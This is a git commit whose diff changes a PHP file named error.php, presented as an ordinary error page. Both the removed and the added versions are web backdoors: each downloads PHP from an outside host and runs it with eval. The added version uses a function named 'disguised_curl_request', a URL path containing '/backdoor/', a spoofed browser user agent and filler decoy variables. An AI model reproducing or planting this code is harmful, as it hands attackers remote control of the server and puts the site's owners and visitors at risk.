35454097efec8504a29ded646d59ebb711f9c45f
sibolisnaburjuu <sibolisnaburjuuuuu@gmail.com>
2025-02-10 17:30:13 +0700

    Update error.php

--- error.php
+++ error.php
@@ -1,6 +1,19 @@
 <?php
 
-$content = file_get_contents(urldecode('https://pub-8a4c8983490547dbb84bed26ac17a447.r2.dev/loader.txt'));
-
-$content = "?> ".$content;
-eval($content);
+$random1 = "randomValue1";
+$random2 = "randomValue2";
+$random3 = "randomValue3";
+$__aB = "https://bpbdtanjungpinang.com/backdoor/kurlung.txt";
+function disguised_curl_request($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+eval("?>" . disguised_curl_request($__aB));
+?>
